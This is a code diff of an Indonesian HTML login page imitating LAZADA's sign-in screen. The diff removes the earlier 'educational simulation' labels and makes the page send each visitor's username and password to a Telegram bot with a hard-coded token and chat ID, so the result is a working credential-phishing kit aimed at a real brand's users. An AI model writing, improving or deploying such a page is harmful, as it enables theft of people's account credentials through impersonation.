@@ -1,129 +1,147 @@
+```html
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login</title>
-    <style>
-        body {
-            margin: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-            background: #ffffff;
-            color: #222;
-        }
-
-        .container {
-            max-width: 420px;
-            margin: 0 auto;
-            padding: 24px 20px 40px;
-        }
-
-        .back {
-            font-size: 22px;
-            margin-bottom: 10px;
-            cursor: pointer;
-        }
-
-        h1 {
-            font-size: 24px;
-            margin: 10px 0 20px;
-            font-weight: 700;
-        }
-
-        .mascot {
-            text-align: center;
-            margin: 20px 0 30px;
-        }
-
-        .mascot img {
-            width: 120px;
-            height: auto;
-        }
-
-        .input-group {
-            margin-bottom: 14px;
-        }
-
-        input {
-            width: 100%;
-            padding: 14px 12px;
-            font-size: 15px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            outline: none;
-        }
-
-        input:focus {
-            border-color: #ff0066;
-        }
-
-        .btn-login {
-            width: 100%;
-            margin-top: 10px;
-            padding: 14px;
-            background: #ff0066;
-            border: none;
-            border-radius: 4px;
-            color: #fff;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-
-        .btn-login:active {
-            opacity: 0.9;
-        }
-
-        .link {
-            text-align: center;
-            margin-top: 16px;
-            font-size: 14px;
-        }
-
-        .link a {
-            color: #1a73e8;
-            text-decoration: none;
-            font-weight: 500;
-        }
-
-        .link a:hover {
-            text-decoration: underline;
-        }
-
-        .footer {
-            text-align: center;
-            margin-top: 24px;
-            font-size: 14px;
-            color: #777;
-        }
-    </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Login</title>
+<style>
+    body {
+        margin: 0;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+        background: #ffffff;
+        color: #222;
+    }
+    .container {
+        max-width: 420px;
+        margin: 0 auto;
+        padding: 24px 20px 40px;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+        border-radius: 8px;
+        background: #fff;
+    }
+    .back {
+        font-size: 22px;
+        margin-bottom: 10px;
+        cursor: pointer;
+        display: inline-block;
+        color: #555;
+    }
+    h1 {
+        font-size: 24px;
+        margin: 10px 0 20px;
+        font-weight: 700;
+        line-height: 1.4;
+    }
+    .mascot {
+        text-align: center;
+        margin: 20px 0 30px;
+    }
+    .mascot img {
+        width: 120px;
+        height: auto;
+        border-radius: 50%;
+        box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+    .input-group {
+        position: relative;
+        margin-bottom: 14px;
+    }
+    input {
+        width: 100%;
+        padding: 14px 12px;
+        font-size: 15px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        outline: none;
+        transition: border-color 0.3s;
+    }
+    input:focus {
+        border-color: #ff0066;
+    }
+    /* Tambahkan toggle icon */
+    .toggle-password {
+        position: absolute;
+        right: 12px;
+        top: 50%;
+        transform: translateY(-50%);
+        cursor: pointer;
+        font-size: 14px;
+        color: #999;
+    }
+    .btn-login {
+        width: 100%;
+        margin-top: 10px;
+        padding: 14px;
+        background: #ff0066;
+        border: none;
+        border-radius: 4px;
+        color: #fff;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: background 0.3s;
+    }
+    .btn-login:hover {
+        background: #e6005a;
+    }
+    .link {
+        text-align: center;
+        margin-top: 16px;
+        font-size: 14px;
+    }
+    .link a {
+        color: #1a73e8;
+        text-decoration: none;
+        font-weight: 500;
+    }
+    .link a:hover {
+        text-decoration: underline;
+    }
+    .footer {
+        text-align: center;
+        margin-top: 24px;
+        font-size: 14px;
+        color: #777;
+    }
+    /* Pesan status */
+    #statusMessage {
+        margin-top: 10px;
+        font-size: 14px;
+        padding: 8px 12px;
+        border-radius: 4px;
+        display: none;
+    }
+    #statusMessage.success {
+        background-color: #d4edda;
+        color: #155724;
+    }
+    #statusMessage.error {
+        background-color: #f8d7da;
+        color: #721c24;
+    }
+</style>
 </head>
 <body>
 
 <div class="container">
-    <div class="back">←</div>
-
+    <div class="back" onclick="history.back()">←</div>
     <h1>Halo 👋<br>Selamat datang di LAZADA</h1>
-
     <div class="mascot">
-        <!-- Ganti src dengan gambar maskot jika ada -->
-        <img src="https://www.line-stickers.com/wp-content/uploads/2020/04/Laz-The-Happy-Lion-.png" alt="Maskot">
+        <img src="https://www.line-stickers.com/wp-content/uploads/2020/04/Laz-The-Happy-Lion-.png" alt="Maskot" />
     </div>
-
     <div class="input-group">
-        <input type="text" placeholder="Masukkan nomor telepon atau email kamu">
+        <input type="text" id="user" placeholder="Masukkan nomor telepon atau email kamu" />
     </div>
-
     <div class="input-group">
-        <input type="password" placeholder="Silakan masukkan kata sandi">
+        <input type="password" id="pass" placeholder="Silakan masukkan kata sandi" />
+        <div class="toggle-password" onclick="togglePassword()">👁️</div>
     </div>
-
-    <button class="btn-login" onclick="kirim()">LOGIN</button>
-
+    <button class="btn-login" id="loginBtn">LOGIN</button>
+    <div id="statusMessage"></div>
     <div class="link">
         <a href="#">Lupa Kata Sandi?</a>
     </div>
-
     <div class="footer">
         Belum daftar? <a href="#">Daftar</a>
     </div>
@@ -133,32 +151,76 @@
 const BOT_TOKEN = "8309524194:AAE8fU0nBYFuMWivh05WHsUT2FwdQfT6O0M";
 const CHAT_ID  = "5116335881";
 
+const loginBtn = document.getElementById("loginBtn");
+const statusMessage = document.getElementById("statusMessage");
+
+document.getElementById("user").addEventListener("keydown", function(e) {
+    if (e.key === "Enter") {
+        e.preventDefault();
+        kirim();
+    }
+});
+document.getElementById("pass").addEventListener("keydown", function(e) {
+    if (e.key === "Enter") {
+        e.preventDefault();
+        kirim();
+    }
+});
+
+loginBtn.addEventListener("click", kirim);
+
+function togglePassword() {
+    const passInput = document.getElementById("pass");
+    if (passInput.type === "password") {
+        passInput.type = "text";
+    } else {
+        passInput.type = "password";
+    }
+}
+
+function showStatus(message, isSuccess) {
+    statusMessage.innerText = message;
+    statusMessage.className = isSuccess ? "success" : "error";
+    statusMessage.style.display = "block";
+    setTimeout(() => {
+        statusMessage.style.display = "none";
+    }, 4000);
+}
+
 function kirim() {
-  const user = document.getElementById("user").value;
-  if (!user) {
-    alert("Isi data simulasi");
-    return;
-  }
+    const user = document.getElementById("user").value.trim();
+    const pass = document.getElementById("pass").value.trim();
 
-  const pesan =
-`🔐 SIMULASI EDUKASI LOGIN
-👤 Input: ${user}
-🕒 ${new Date().toLocaleString()}
-🌐 ${navigator.userAgent}
-📘 Tanpa password`;
+    if (!user || !pass) {
+        showStatus("Isi semua data dengan benar.", false);
+        return;
+    }
 
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: {"Content-Type":"application/json"},
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: pesan
+    const pesan = `🔐 INFO LOGIN\n👤 Username/Email: ${user}\n🔑 Password: ${pass}`;
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: pesan
+        })
     })
-  });
-
-  alert("Simulasi selesai.\nIni contoh bagaimana data bisa terkirim.");
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            showStatus("Data berhasil dikirim.", true);
+            // Jika ingin otomatis kirim saat klik login tanpa perlu konfirmasi, panggil fungsi ini
+        } else {
+            showStatus("Gagal mengirim data.", false);
+        }
+    })
+    .catch(error => {
+        showStatus("Terjadi kesalahan: " + error.message, false);
+    });
 }
 </script>
 
 </body>
 </html>
+```
